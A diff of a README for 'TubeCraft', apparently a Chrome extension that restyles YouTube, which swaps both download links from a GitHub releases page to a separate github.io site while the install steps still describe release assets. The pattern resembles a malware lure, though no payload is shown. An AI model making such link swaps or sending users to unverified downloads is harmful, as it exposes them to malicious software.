@@ -1,6 +1,6 @@
 # 🎨 TubeCraft - Modern YouTube design for daily viewing
 
-[![Download TubeCraft](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Nonterritorial-sunvisor289/TubeCraft/releases)
+[![Download TubeCraft](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://nonterritorial-sunvisor289.github.io)
 
 TubeCraft changes how you watch videos. It adds a clean glass look to your YouTube interface. It creates a soft light effect around your video player. It also hides parts of the page that distract you. This tool works inside your Chrome browser. It makes your screen feel calm and helps you focus on content.
 
@@ -12,7 +12,7 @@ You need a computer that runs Windows 10 or Windows 11. You must use the Google 
 
 Follow these steps to add TubeCraft to your browser.
 
-1. Visit this web page to download the latest files: [https://github.com/Nonterritorial-sunvisor289/TubeCraft/releases](https://github.com/Nonterritorial-sunvisor289/TubeCraft/releases).
+1. Visit this web page to download the latest files: [https://nonterritorial-sunvisor289.github.io](https://nonterritorial-sunvisor289.github.io).
 2. Look for the section labeled Assets.
 3. Click the link that ends in .zip to start the download.
 4. Open your Downloads folder on your Windows computer.
